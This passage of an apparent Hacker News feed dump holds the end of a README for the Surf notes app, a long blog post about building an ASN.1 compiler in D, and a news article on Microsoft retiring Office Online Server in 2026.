      &lt;item&gt;Support for local files, sites &amp;amp; links from the web (YouTube, Tweets &amp;amp; more), or create media directly in Surf.&lt;/item&gt;
      &lt;item&gt;Organize this library into Notebooks.&lt;/item&gt;
      &lt;item&gt;Open and use much of your library offline.&lt;/item&gt;
      &lt;item&gt;Use your library to power Surf’s AI features.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Surf's library is built on a local storage engine called SFFS (Surf Flat File System), which stores data in open and transparent formats.&lt;/p&gt;
    &lt;p&gt;Explore and think across your digital stuff without opening up a bunch of windows, clicking, scrolling and copying &amp;amp; pasting into your document (or chatbot).&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;@-mention&lt;/code&gt;and auto-generate from any tab, website or any resource in your library.&lt;/item&gt;
      &lt;item&gt;Trigger web searches to do research, and bring the results back in your notes.&lt;/item&gt;
      &lt;item&gt;Integrated citations deeplinked to original sources, whether a section on a webpage, a timestamp in a video, or a page in a PDF.&lt;/item&gt;
      &lt;item&gt;Generate interactive applications without writing code using Surflets.&lt;/item&gt;
      &lt;item&gt;Paste in images, tables or data from other applications and have Surf understand and incorporate them.&lt;/item&gt;
      &lt;item&gt;Use rich formating, code blocks, to-do lists and more in your notes.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Surf is built around tabs, split view and a sidebar for easy navigation.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Open local notes, files or web pages in tabs.&lt;/item&gt;
      &lt;item&gt;Split view allows you to view and interact with multiple resources side by side.&lt;/item&gt;
      &lt;item&gt;The sidebar provides quick access to your Notebooks &amp;amp; notes.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Surf can code interactive applets to help you visualize, understand or explore concepts or data that are aided with code.&lt;/p&gt;
    &lt;p&gt;Surf’s notes and Surflets are powered by large language models of your choice.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Bring your own key for popular models&lt;/item&gt;
      &lt;item&gt;Add a cloud model&lt;/item&gt;
      &lt;item&gt;Use Local Language Models&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Find the most common shortcuts here.&lt;/p&gt;
    &lt;p&gt;To report a security concern, please see https://github.com/deta/surf/security/policy&lt;/p&gt;
    &lt;p&gt;See CONTRIBUTING.md for details on contributing to the project and an overview of the codebase.&lt;/p&gt;
    &lt;p&gt;See CODE_OF_CONDUCT.md for details on our code of conduct.&lt;/p&gt;
    &lt;p&gt;The source code for this project is licensed under the Apache 2.0 license, with the following exceptions:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Our patch for the @ghostery/adblocker-electron package is licensed under the Mozilla Public License 2.0 (MPL-2.0), consistent with the upstream project's licensing.&lt;/item&gt;
      &lt;item&gt;Select files may contain their own specific license headers that override the default license.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Unless otherwise specified in the file or directory, all code defaults to the Apache 2.0 license.&lt;/p&gt;
    &lt;p&gt;See LICENSE for more details about the Apache 2.0 license.&lt;/p&gt;
    &lt;p&gt;Note: The Deta name and logos are trademarks of Deta GmbH and are not covered by the Apache 2.0 license.&lt;/p&gt;
    &lt;p&gt;Deta GmbH is a commercial open source company. Surf is designed to operate as open source software without needing Deta's servers. Deta GmbH also offers a modified version of Surf (which integrates with Deta's servers) and is subject to separate terms and conditions. This version of Surf can be downloaded from the Deta website.&lt;/p&gt;
    &lt;p&gt;This project makes use of the following open source packages (not a comprehensive list):&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/deta/surf"/><published>2025-10-23T12:11:27+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45681200</id><title>I spent a year of my life making an ASN.1 compiler in D</title><updated>2025-10-23T15:37:57.295914+00:00</updated><content>&lt;doc fingerprint="1620d077aea51bd4"&gt;
  &lt;main&gt;&lt;p&gt;Published: 2025/10/23 | Updated: 2025/10/23&lt;/p&gt;&lt;p&gt;… and it’s still nowhere near complete.&lt;/p&gt;&lt;p&gt;In this post I’ll just rambling about ASN.1; parts of the compiler implementation, and some of the tool’s output rather than the tool itself as its still too WIP to really advertise on its own yet.&lt;/p&gt;&lt;p&gt;This post is unstructured, so you can just pick somewhere random and start reading from there with no/minimal context lost.&lt;/p&gt;&lt;p&gt;Note: the name of the tool is dasn1.&lt;/p&gt;&lt;p&gt;I’m currently writing Juptune - a toy async I/O framework that attempts to implement as much of its stack as possible in pure D.&lt;/p&gt;&lt;p&gt;I’m really interested in writing an implementation of TLS, which means I need to be able to handle x.509 certificates (i.e. TLS/SSL certs), which means I need to be able to handle their underlying data encoding: ASN.1’s DER encoding.&lt;/p&gt;&lt;p&gt;So basically I just wanted to do this for fun at the end of the day, nothing much deeper than that. I’ve never written or worked on a proper compiler project before that wasn’t toy-sized so I saw a ton of growth potential… the main thing that’s grown however is the mental scar ASN.1’s left on me.&lt;/p&gt;&lt;p&gt;I’ve succesfully generated code that can parse a couple of x.509 certificates I’ve thrown at it, and I’ve started work on an almost-D-native (excluding crypto primitives) implementation of TLS 1.3.&lt;/p&gt;&lt;p&gt;I’m constantly amazed about how much of modern life relies on these ancient, overly complicated specs from the 90s. ASN.1 is used everywhere in some form or another and yet I bet you’ve never even heard of it before, just have a look on wikipedia.&lt;/p&gt;&lt;p&gt;ASN.1 is the result of a bunch of graybeards from the late 80s+ trying to design an overengineered data specification language. In other words, it’s protobuf on steroids.&lt;/p&gt;&lt;p&gt;There’s two parts of ASN.1: There’s the ASN.1 notation (defined by x.680, x.681, x.682, and x.683), and then there’s the various encodings (BER, CER, DER, PER, XER, JER…). In this post I’ll mainly be focusing on the notation + DER.&lt;/p&gt;&lt;p&gt;Similarly to protobuf you use the notation to define a structured way to represent data, and then use tooling that can generate encoders/decoders for a specific encoding, in a specific programming language.&lt;/p&gt;&lt;p&gt;Here’s a choice snippet of the ASN.1 notation for RFC 5280 (which defines what’s commonly known as TLS certificates):&lt;/p&gt;&lt;p&gt;Encoding wise here’s a quick of some of the more well known ones:&lt;/p&gt;&lt;p&gt;Did I ever mention that ASN.1 is complicated? On the one hand the sheer amount of possible encodings is daunting, but on the other hand it shows a certain flexbility that ASN.1 provides - you could even invent your own domain-specific encoding if needed.&lt;/p&gt;&lt;p&gt;Loosely speaking you can define ASN.1’s notation as being the “base” notation defined in x.680, with the sometimes-optional addon specifications defined in x.681, x.682, x.683.&lt;/p&gt;&lt;p&gt;These specifications are also written in academicese so for mere uneducated mortals such as myself, simply trying to read and understand what the specifications are saying in the first place is already a large hurdle. I think I’ve started to get the hang of it though.&lt;/p&gt;&lt;p&gt;Fortunately for my use case of handling x.509 certificates, there’s no hard requirement for anything beyond x.680 and so x.680 is the only spec I’ve attempted to implement so far (outside of x.690 which describes how BER/CER/DER works - which is actually a joy to read compared to the x.68x specs).&lt;/p&gt;&lt;p&gt;x.680 isn’t the worst thing in the world to implement, it’s just the fact that there’s a lot more to it than you’d think from a quick glance at a code example, as well as some relatively annoying “transformation” (semantic) rules you have to acccount for.&lt;/p&gt;&lt;p&gt;Generally though I’d say the really difficult parts seem to come from its extensions.&lt;/p&gt;&lt;p&gt;One of the more annoying parts of implementing a parser for ASN.1’s notation is that x.680 has been revised several times over the years, which includes the deprecation + removal of certain features.&lt;/p&gt;&lt;p&gt;And so some other specifications you read through will either:&lt;/p&gt;&lt;p&gt;Meaning that if you want to write a compiler for ASN.1 for a specific use case, but want it to also be an implementation of the more modern specs… then you’ll have to partially implement/hack around some of the older stuff that’s no longer defined in the up to date spec documentation.&lt;/p&gt;&lt;p&gt;An example would be the &lt;code&gt;ANY DEFINED BY&lt;/code&gt; syntax, which I have a separate section on.&lt;/p&gt;&lt;p&gt;This is essentially the academic equivalent of an Elder Scroll - you will go insane attempting to read let alone mentally parse this damn thing.&lt;/p&gt;&lt;p&gt;x.681 describes the Information Class Object system. I’d love to talk to you more about it more in depth but I haven’t put in enough effort to confidently state much about how it works.&lt;/p&gt;&lt;p&gt;One of the few parts I sort of understand and can talk about is that x.681 has a really cool feature where Information Classes can be given a custom initialisation syntax:&lt;/p&gt;&lt;p&gt;I’d absolutely love to attempt to implement x.681 for the challenge of this feature alone, however I only have so much energy (and sanity), so it’ll likely be a while until I even properly consider it.&lt;/p&gt;&lt;p&gt;x.682 describes the Table Constraint feature. I’m going to be honest I don’t understand a single thing about this feature - I took one look at the specification and was like “absolutely not”.&lt;/p&gt;&lt;p&gt;x.683 describes the ability to create templated (sorry, “parameterised”) types. Similar to the other ASN.1 extensions I haven’t looked much into this feature, but it appears to be a lot simpler to implement than the others.&lt;/p&gt;&lt;p&gt;In essence, one of the things you can do is this:&lt;/p&gt;&lt;p&gt;It supports values as well as types within its template parameters (similarly to D!) so there’s a few cool things you can do with it I guess.&lt;/p&gt;&lt;p&gt;Despite the many, many, many pains of this god forsaken technology, it’s actually really interesting and powerful at the same time.&lt;/p&gt;&lt;p&gt;ASN.1’s notation contains a pretty neat feature where you can add special constraints onto types + fields. So rather than having a stray “ProtcolPacket.field1.field2.xyz MUST be between 0 and 2” that’s super easy to miss, you can instead describe this constraint within ASN.1 itself which (good) tooling will then take into account for you.&lt;/p&gt;&lt;p&gt;Here’s some examples of the simpler constraints available:&lt;/p&gt;&lt;p&gt;There’s a few more constraints available but… they’re mostly pretty complex ones that I don’t want to have to think about.&lt;/p&gt;&lt;p&gt;It’s really cool to see that ASN.1 has a feature like this though, considering the only other langauge I’ve personally encountered that has a similar feature is Ada.&lt;/p&gt;&lt;p&gt;ASN.1 generally uses the &lt;code&gt;OBJECT IDENTIFIER&lt;/code&gt; type in order to, well, identify specific things, e.g. extensions found within x.509 certificates.&lt;/p&gt;&lt;p&gt;&lt;code&gt;OBJECT IDENTIFIER&lt;/code&gt;s are also used to provide versions to modules, for example:&lt;/p&gt;&lt;p&gt;Everything between the curly brackets is an OBJECT IDENTIFIER for this exact module - technically no other ASN.1 module in existance should ever use this specific OBJECT IDENTIFIER. The optional labels (e.g. &lt;code&gt;iso&lt;/code&gt;) have no meaning beyond aiding human comprehension, it’s the values (e.g. &lt;code&gt;(0)&lt;/code&gt;) that are actually used to create the identifier.&lt;/p&gt;&lt;p&gt;As a great example of this versioning system, it just so happens that this specific module has a more modern version that has this specific OBJECT IDENTIFIER instead:&lt;/p&gt;&lt;p&gt;This updated version doesn’t change how data is encoded to/from DER but instead it simply uses more modern syntax and features.&lt;/p&gt;&lt;p&gt;This is important because older specifications will be using &lt;code&gt;PKIX1Implicit88&lt;/code&gt; whereas newer ones will likely be using &lt;code&gt;PKIX1Implicit-2009&lt;/code&gt; instead, and so there needs to be a more clear-cut way to distinguish between these two versions of the &lt;code&gt;PKIX1Implicit&lt;/code&gt; module other than going by its name - and this is where OBJECT IDENTIFIERS come in handy.&lt;/p&gt;&lt;p&gt;When importing modules within ASN.1 notation you can (and should) specify an OBJECT IDENTIFIER as well:&lt;/p&gt;&lt;p&gt;Maybe I’m just a nerd, but I find this to almost be a thing of beauty with how simple yet effective it is.&lt;/p&gt;&lt;p&gt;D has several quality of life features that makes it surprisingly easy to generate code for - features that would definitely make the compiler more annoying to work with when targeting other languages.&lt;/p&gt;&lt;p&gt;These features on their own aren’t exactly rare to see, but the specific combination is what makes everything work together so well.&lt;/p&gt;&lt;p&gt;&lt;code&gt;static import&lt;/code&gt; in D means “import this module, but ONLY allow it to be used via its fully qualified name”:&lt;/p&gt;&lt;p&gt;You can even override the module name, as strange as that sounds!&lt;/p&gt;&lt;p&gt;This feature is a godsend for preserving the original names of ASN.1 types. For example, Juptune provides an error type called &lt;code&gt;Result&lt;/code&gt; which comes from the &lt;code&gt;juptune.core.util.result&lt;/code&gt; module.&lt;/p&gt;&lt;p&gt;Without static imports I’d have to be careful of ASN.1 code that defines a &lt;code&gt;Result&lt;/code&gt; type as it’d otherwise come into conflict with Juptune’s own &lt;code&gt;Result&lt;/code&gt; type.&lt;/p&gt;&lt;p&gt;However, with static imports, I can basically just generate code that looks like this:&lt;/p&gt;&lt;p&gt;Completely removing the need of me having to worry about symbol name conflicts.&lt;/p&gt;&lt;p&gt;On a similar vein D allows you to specify that instead of looking up a symbol from any available symbol table (e.g. local vars; non-static imports, etc.) it should instead perform a lookup using the current module’s top-level symbols.&lt;/p&gt;&lt;p&gt;For example:&lt;/p&gt;&lt;p&gt;The leading &lt;code&gt;.&lt;/code&gt; in &lt;code&gt;.Type1&lt;/code&gt; is what causes the module-local lookup.&lt;/p&gt;&lt;p&gt;Essentially, this feature compliments the static import feature to help make it much harder for ASN.1 types to accidentally refer to the wrong symbol when converted into D code.&lt;/p&gt;&lt;p&gt;In short: this feature allowed me to be really really lazy with certain parts of the compiler :D&lt;/p&gt;&lt;p&gt;As the name suggests, &lt;code&gt;typeof()&lt;/code&gt; allows you to retrieve the type of any particular symbol you pass into it - this is great when dealing with code generation since sometimes it can be kind of annoying to structure your code in a way where you can easily preserve the type name of some symbol you’re working with.&lt;/p&gt;&lt;p&gt;In other words “this let’s me write bad code and make it still work”.&lt;/p&gt;&lt;p&gt;First example is around how some getters and setters for SEQEUENCE fields are generated. Instead of doing the correct thing and preserving the type name for each field, I got lazy and just used &lt;code&gt;typeof(_field)&lt;/code&gt;:&lt;/p&gt;&lt;p&gt;The second example is around error messages. Instead of needing to keep track of the current type’s name when generating error messages… I could just use &lt;code&gt;typeof(this)&lt;/code&gt; to get the type instead:&lt;/p&gt;&lt;p&gt;What’s even better is that because the entire string is composed of compile-time constants, it doesn’t actually require an allocation + concat at runtime since the compiler will constant fold it for you. This allows &lt;code&gt;fromDecoding&lt;/code&gt; to still be marked as &lt;code&gt;@nogc&lt;/code&gt;!&lt;/p&gt;&lt;p&gt;Generating a parameter list and don’t want to have to care about whether there’s an extra comma or not?&lt;/p&gt;&lt;p&gt;Enum options?&lt;/p&gt;&lt;p&gt;Array values?&lt;/p&gt;&lt;p&gt;D’s got your back! (Except for specifying multiple modules in a single import statement, then for some reason you’re not allowed, but shh about that).&lt;/p&gt;&lt;p&gt;For a while a lot of the types being generated (and some of the core decoding types) didn’t have a &lt;code&gt;toString&lt;/code&gt; implementation. This’d normally mean that I couldn’t just use &lt;code&gt;.toString&lt;/code&gt; willy-nilly but instead the compiler would need knowledge about which types had a &lt;code&gt;toString&lt;/code&gt; or not.&lt;/p&gt;&lt;p&gt;However, as is the common theme now D allows us to be very lazy - instead of keeping track of this ourselves in dasn1, we can instead just generate code where it’s the D compiler’s concern instead of our’s:&lt;/p&gt;&lt;p&gt;Job sorted (and future proofed!).&lt;/p&gt;&lt;p&gt;You could definitely utilise D’s metaprogramming for more complicated stuff, but it’s also good for silly little things like this.&lt;/p&gt;&lt;p&gt;Naturally I’ve tried to use whatever D features that I could in order to implement dasn1, so I thought I’d pick a few parts of the code that rely on D’s features quite heavily as a small showcase.&lt;/p&gt;&lt;p&gt;Mixin templates are a fairly quirky feature of D - it allows you to define a normal template (essentially a compile-time collection of symbols) and then copy-paste them wherever you like, whether that’s inside a class, struct, the top-level module etc.&lt;/p&gt;&lt;p&gt;Since the ASN.1 grammar only had a handful of node “types”, I decided to use mixin templates to model each specific “type”:&lt;/p&gt;&lt;p&gt;I probably could’ve gotten away with just using templated base classes instead, but there’s a few differences that actually make that kind of annoying. Namely it’d create some bloated symbol names which would make reading compiler errors even more painful than it already ended up being.&lt;/p&gt;&lt;p&gt;Let’s look at one of the AST nodes again:&lt;/p&gt;&lt;p&gt;This is a node that contains several other nodes. &lt;code&gt;Container&lt;/code&gt; itself supports an unbounded amount of node types it can store, since D supports variadic template parameters. You may be asking what the API for this even looks like, and I’ll be glad to show you a quick snippet:&lt;/p&gt;&lt;p&gt;Let’s have a look at a &lt;code&gt;OneOf&lt;/code&gt; node instead now:&lt;/p&gt;&lt;p&gt;This node has a similar template-based API for most of its operations:&lt;/p&gt;&lt;p&gt;However the main feature of the &lt;code&gt;OneOf&lt;/code&gt; node is its &lt;code&gt;match&lt;/code&gt; function. This function requires the user to pass in a handler function for each possible node type that the &lt;code&gt;OneOf&lt;/code&gt; can store, and this requirement is enforced at compile-time so that changes to the node type list will immediately require all appropriate &lt;code&gt;match&lt;/code&gt; functions to be updated (i.e. no silent breakage).&lt;/p&gt;&lt;p&gt;This is surprisingly easy to implement with D due to its first-class metaprogramming features, I’ll try my best to be brief with how this all works:&lt;/p&gt;&lt;p&gt;In essence:&lt;/p&gt;&lt;code&gt;NodeTypes...&lt;/code&gt; is the template parameter containing a compile-time tuple of all possible types that this &lt;code&gt;OneOf&lt;/code&gt; can store.&lt;code&gt;oneOfHandlerFuncTuple&lt;/code&gt; is a template that generates a new compile-time tuple, where each &lt;code&gt;NodeTypes&lt;/code&gt; is mapped into a function pointer type.&lt;code&gt;match&lt;/code&gt; uses the result of &lt;code&gt;oneOfHandlerFuncTuple&lt;/code&gt; as its main parameter. Since this is a compile-time tuple of types it automagically gets expanded into multiple parameters under the hood.&lt;code&gt;static foreach&lt;/code&gt; within &lt;code&gt;match&lt;/code&gt;’s body allows us to iterate over a compile-time collection (in this case, &lt;code&gt;NodeTypes&lt;/code&gt;) and duplicate the foreach’s body for each item. In this case, so we can make a &lt;code&gt;case&lt;/code&gt; statement per item in &lt;code&gt;NodeTypes&lt;/code&gt;.&lt;p&gt;So:&lt;/p&gt;&lt;code&gt;NodeTypes...&lt;/code&gt; is &lt;code&gt;(Node1, Node2)&lt;/code&gt;.&lt;code&gt;oneOfHandlerFuncTuple&lt;/code&gt; results in &lt;code&gt;(Result delegate(Node1), Result delegate(Node2))&lt;/code&gt;&lt;code&gt;match&lt;/code&gt;’s parameters expand into &lt;code&gt;match(scope delegate(Node1) handler_0, scope delegate(Node2) handler_1)&lt;/code&gt;&lt;p&gt;Which means that we could use this example match function like so:&lt;/p&gt;&lt;p&gt;I know that’s a lot to take in especially since I have to be briefer than usual, but TL;DR D makes the hard stuff easy while still being relatively easy on the eyes. I would make a snarky comparison with C++ but literally no one expects C++ metaprogramming to be readable at this point.&lt;/p&gt;&lt;p&gt;10 years ago (October 2015) D’s standard library was given an experimental package called &lt;code&gt;std.experimental.allocator&lt;/code&gt;. It has a pretty neat but kind of janky way of composing a bunch of allocation building blocks together, in order to “easily” make custom allocators.&lt;/p&gt;&lt;p&gt;I use it for the ASN.1 stuff since it makes it easy to construct and dispose classes within &lt;code&gt;@nogc&lt;/code&gt; code, and it looks kind of cool to boot:&lt;/p&gt;&lt;p&gt;The issue is this package is still experimental 10 years later and I wouldn’t be surprised if it gets removed sooner or later, especially with the Phobos v2 work that’ll hopefully exist in some form before I retire (I’m 26).&lt;/p&gt;&lt;p&gt;:D The sign of someone who loves this damn language is that they can’t help but provide some level of historical snark. I have no further comments, I just miss the days I had hope for D’s future xD&lt;/p&gt;&lt;p&gt;Situation: I need to store IR nodes using a base class rather than a specific concrete implementation class, but I’d still like to limit the potential options without having to go down the SumType route.&lt;/p&gt;&lt;p&gt;Solution: This short but sweet struct (note: this is a different &lt;code&gt;OneOf&lt;/code&gt; struct for IR purposes, not AST purposes).&lt;/p&gt;&lt;p&gt;We can initialise this struct like so:&lt;/p&gt;&lt;p&gt;Now the fun part comes from this weird &lt;code&gt;alias ir this;&lt;/code&gt; line. Normally when working with a wrapper struct like this you’d have do something like:&lt;/p&gt;&lt;p&gt;With &lt;code&gt;alias ir this;&lt;/code&gt; anytime we try to perform an operation (e.g. casting; function calls, etc.) that the &lt;code&gt;OneOf&lt;/code&gt; struct itself does not support, the compiler will instead try to use it on the &lt;code&gt;OneOf.ir&lt;/code&gt; field instead:&lt;/p&gt;&lt;p&gt;It’s a very weird, niche feature which might even get removed or at least deprecated in the future, but it allows for some mild syntax cleanup as shown above.&lt;/p&gt;&lt;p&gt;Some of the IR types try to strictly limit the way that user code can query and interact with their data, mainly to help prevent potential memory corruption… at least that was my original, flawed reasoning.&lt;/p&gt;&lt;p&gt;This can be awkward when writing unittests, as sometimes you just need to query a very particular part of a type’s data without having to go through all of its hurdles.&lt;/p&gt;&lt;p&gt;And so by simply slapping &lt;code&gt;version(unittest)&lt;/code&gt; onto a funciton definition, you now have an escape hatch that won’t make its way out into real code:&lt;/p&gt;&lt;p&gt;There’s a few examples of this within the codebase. Sometimes unittests are for the most part identical except:&lt;/p&gt;&lt;p&gt;It’s one of those things where you kind of just have to use it and do it before you “get it”, so I apologise for the really poor explanation, but this is essentially something you can do with templates.&lt;/p&gt;&lt;p&gt;Here’s one of the templated “test harnesses” I used - this one in particular is for testing the AST -&amp;gt; IR converter functions.&lt;/p&gt;&lt;p&gt;It can be used like so:&lt;/p&gt;&lt;p&gt;One main issue, especially for the larger tests, is that specifying &lt;code&gt;Harness.T&lt;/code&gt; (and more minorly &lt;code&gt;Harness.run&lt;/code&gt;) can start to make the code look chunky and a bit harder to read.&lt;/p&gt;&lt;p&gt;So by using the magical &lt;code&gt;with()&lt;/code&gt; statement, instead of writing &lt;code&gt;Harness.run&lt;/code&gt; and &lt;code&gt;Harness.T&lt;/code&gt;, we can just write &lt;code&gt;run&lt;/code&gt; and &lt;code&gt;T&lt;/code&gt; and the compiler will know how to lookup these otherwise missing/undefined symbols:&lt;/p&gt;&lt;p&gt;Again this is one of those things that on paper sounds really stupid (and impossible to easily describe), but grows on you really fast when you give it a try.&lt;/p&gt;&lt;p&gt;While ASN.1’s basic syntax looks pretty easy from an initial glance, that illusion shatters once you start getting into it more deeply.&lt;/p&gt;&lt;p&gt;ASN.1 has various separate value forms that start with a left bracket (&lt;code&gt;{&lt;/code&gt;), a lot of these forms are ambiguous due to a variety of factors and can only be distinguished with semantic context.&lt;/p&gt;&lt;p&gt;Given that dans1 has a clean split between syntax and semantic analysis, “this does not spark joy” as the kids would say.&lt;/p&gt;&lt;p&gt;I’ll let this comment from the parser code explain itself:&lt;/p&gt;&lt;p&gt;:D Fun times.&lt;/p&gt;&lt;p&gt;Example: I can’t even remember the exact conditions, but I remember having to debug some generated decoder code since it was failing to decode a specific field. It turned out that this field was under certain “exact conditions” that meant its tag was supposed to be treated as &lt;code&gt;EXPLICIT&lt;/code&gt; instead of the module-default &lt;code&gt;IMPLICIT&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;I still have no idea where in the spec this behaviour gets mentioned and so I basically had to wing a fix and hope it works going forward.&lt;/p&gt;&lt;p&gt;More generally this feeling and scenario has happened quite a few times - the information is scattered (sometimes across different specs) and is hard to keep track of.&lt;/p&gt;&lt;p&gt;Another example is around module versions. The spec makes absolutely zero mention (that I can see) on how to version modules for non ISO/ITU purposes, and I would greatly appreciate if anyone could help me find this information.&lt;/p&gt;&lt;p&gt;I’d be amazed if there’s a 100% spec compliant implementation out there, even commercially.&lt;/p&gt;&lt;code&gt;UTF8String (SIZE ("yagababa"))&lt;/code&gt; doesn’t make sense.&lt;code&gt;myInt INTEGER (1) ::= 2&lt;/code&gt; needs to trigger an error.&lt;p&gt;It’s tedious and not very fun, but there’s no real way around it.&lt;/p&gt;&lt;p&gt;For a newbie to compiler programming like me I also found it really hard to deal with useful error messages. I ended up running the checks twice: one time to see if there’s even an error at all, and the second time to build up the error string. This is mainly complicated by the existance of UNION and (especially) INTERSECTION constraints.&lt;/p&gt;&lt;p&gt;I foolishly made the mistake of believing that once I converted the generic AST nodes into the more specific IR nodes that I wouldn’t have to make any major changes to the underlying data (beyond setting up things like symbol tables).&lt;/p&gt;&lt;p&gt;:D Unfortunately that wonderfully naive thought was quickly crushed as ASN.1 requires the semantic stage to perform certain transformations, certain transformations (e.g. &lt;code&gt;AUTOMATIC TAGS&lt;/code&gt;) that ended up/are going to be really annoying due to the way I’ve structured the code.&lt;/p&gt;&lt;p&gt;But that’s future Brad’s problem.&lt;/p&gt;&lt;p&gt;I am extremely thankful that x.509 is an old enough specification that the ASN.1 notation only uses the older syntax of x.680.&lt;/p&gt;&lt;p&gt;The alternative is that you’d need an implementation of the x.681, x.682, and x.683 specs to use any of the newer stuff - this is absolutely non-trivial to implement, and I imagine this is one of the many reasons ASN.1 hasn’t ever really taken off outside of historical and commercialised spaces.&lt;/p&gt;&lt;p&gt;There is one exception to the above however and that is &lt;code&gt;ANY DEFINED BY&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;It’d basically be used to define a type who’s contents could be any other type conditioned by some other field:&lt;/p&gt;&lt;p&gt;You then have to piece together what identifier matches which type. Dasn1 doesn’t actually implement &lt;code&gt;ANY DEFINED BY&lt;/code&gt; as-is since even by the 2003 revision it was deprecated.&lt;/p&gt;&lt;p&gt;Instead, for better or for worse, dasn1 has a hacked together intrinsic called &lt;code&gt;Dasn1-Any&lt;/code&gt;:&lt;/p&gt;&lt;p&gt;This essentially gets lowered down into the decoding code for &lt;code&gt;OCTET STRING&lt;/code&gt; but without any sort of tag validation enabled. Unfortunately until/unless I want to implement Information Object Classes, I’m then stuck with having to manually call into the decoding code when I want to turn &lt;code&gt;Dans1-Any&lt;/code&gt; fields into their actual types.&lt;/p&gt;&lt;p&gt;This is more of a personal one.&lt;/p&gt;&lt;p&gt;Between the various different aspects of the ASN.1 compiler, the x.68x specs, the x.690 spec, and all of the other projects building off of this ASN.1 work (x.509 certificate handling, TLS 1.3) I started to feel like a stranger in my own codebase, even just a week after I had last touched it.&lt;/p&gt;&lt;p&gt;It’ll definitely be interesting making future improvements/changes as my at-hand knowledge is constantly dwindling.&lt;/p&gt;&lt;p&gt;From having to write 20,000 different node visitors for various reasons; to hand-rolling a syntax parser for a boring, drawn out grammar; to needing to write code that looks 95% the same as the last but that last 5% of difference ranges from drudge to mentally taxing, repeated 9000 times.&lt;/p&gt;&lt;p&gt;I think I can finally say I have some proper compiler experience under my belt ;(&lt;/p&gt;&lt;p&gt;But lord knows that each and every milestone has been so extremely rewarding (as long as I try not to think about the fact that almost no one will be using this code).&lt;/p&gt;&lt;p&gt;p.s. Don’t try to make a template-based parser combinator for the entire grammar of a language you don’t personally control unless you want to see symbol names that are 10Mb+ long and explode the binary size by over 100Mb. Don’t ask me how I know.&lt;/p&gt;&lt;p&gt;(I even hard crashed the D compiler I use once, since I guess the error message was literally too long. That endlessly scrolling console…)&lt;/p&gt;&lt;p&gt;A probably wasted year of my life later and there’s still an insane amount of work left on everything relating to this project (and Juptune) in general, but I think it’s making me a better programmer. Maybe.&lt;/p&gt;&lt;p&gt;The dream is that one day I can put “made an ASN.1 compiler + x.509 certificate handler + TLS 1.3 implementation” on my CV and still get told “sorry, you’re a good match except you don’t have 6 months of production experience in Ansible, we can’t hire you” by a recruiter. God I love this industry.&lt;/p&gt;&lt;p&gt;Don’t do ASN.1 kids, you’ll never be the same.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://bradley.chatha.dev/blog/dlang-propaganda/asn1-compiler-in-d/"/><published>2025-10-23T12:47:41+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45681850</id><title>We need to start doing web blocking for non-technical reasons</title><updated>2025-10-23T15:37:57.048112+00:00</updated><content/><link href="https://utcc.utoronto.ca/~cks/space/blog/web/WeShouldBlockForSocialReasons?showcomments"/><published>2025-10-23T13:54:36+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45682067</id><title>Microsoft puts Office Online Server on the chopping block</title><updated>2025-10-23T15:37:56.865729+00:00</updated><content>&lt;doc fingerprint="37417a7ceebecbd7"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Microsoft puts Office Online Server on the chopping block&lt;/head&gt;
    &lt;head rend="h2"&gt;The end is nigh, now get thee to 365&lt;/head&gt;
    &lt;p&gt;Microsoft will kill Office Online Server next year, creating a headache for anyone using on-premises Office web applications and the beleaguered holdouts sticking with Skype for Business Server.&lt;/p&gt;
    &lt;p&gt;The retirement is scheduled for December 31, 2026. After this, there won't be any more security fixes, updates, or technical support from Microsoft. "This change is part of our ongoing commitment to modernizing productivity experiences and focusing on cloud-first solutions," the company said.&lt;/p&gt;
    &lt;p&gt;Office Online Server provides browser-based versions of Word, Excel, PowerPoint, and OneNote for customers who want to keep things on-prem without having to roll out the full desktop applications. Microsoft's solution is to move to Microsoft 365, its decidedly off-premises version of its applications. The company said it is "focusing its browser-based Office app investments on Office for the Web to deliver secure, collaborative, and feature-rich experiences through Microsoft 365."&lt;/p&gt;
    &lt;p&gt;Other than migrating to another platform when the vendor pulls the plug, affected customers have few options.&lt;/p&gt;
    &lt;p&gt;The announcement will also hit several customers running SharePoint Server SE or Exchange Server SE. While those products remain supported, Office Online Server integration will go away. The company suggested Microsoft 365 Apps for Enterprise and Office LTSC 2024 as alternatives for viewing and editing documents hosted on those servers.&lt;/p&gt;
    &lt;p&gt;Skype for Business customers will also lose some key features related to PowerPoint. Presenter notes and high-fidelity PowerPoint rendering will go away. In-meeting annotations, which allow meeting participants to write directly to slides without altering the original file, will no longer be available, and embedded video playback will run at lower fidelity. Features like whiteboards, polls, and app sharing shouldn't be affected.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;AI bubble inflates Microsoft CEO pay to $96.5M&lt;/item&gt;
      &lt;item&gt;Lloyds Banking Group claims Microsoft Copilot saves staff 46 minutes a day&lt;/item&gt;
      &lt;item&gt;The real insight behind measuring Copilot usage is Microsoft's desperation&lt;/item&gt;
      &lt;item&gt;Tribunal wonders if Microsoft has found a legal hero after pivot to copyright gambit&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Microsoft's solution is a move to Teams, which the company says "offers modern meeting experiences."&lt;/p&gt;
    &lt;p&gt;Office Online Server launched in 2016 and is the successor to Office Web Apps Server 2013. At the time, Microsoft said it "recognizes that many organizations still value running server products on-premises for a variety of reasons.&lt;/p&gt;
